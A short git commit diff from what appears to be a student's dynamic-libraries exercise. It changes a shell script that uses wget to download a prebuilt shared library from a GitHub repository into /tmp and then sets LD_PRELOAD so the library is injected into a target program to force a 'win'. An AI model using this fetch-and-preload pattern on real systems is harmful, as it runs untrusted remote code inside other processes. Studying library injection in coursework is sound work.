951b409c98d8387f8d7bdfab4f360bfcff28a3d0
Chris Mukirae <chriskagiko@gmail.com>
2023-06-19 20:13:58 +0300

    Task 3 correction.4
    This commit is for marking of task 3

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/ThaKookieMansta/zero_day/blob/master/awin.so
-export LD_PRELOAD=/tmp/awin.so
+wget -P /tmp https://github.com/ThaKookieMansta/zero_day/blob/master/iwin.so
+export LD_PRELOAD=/tmp/iwin.so
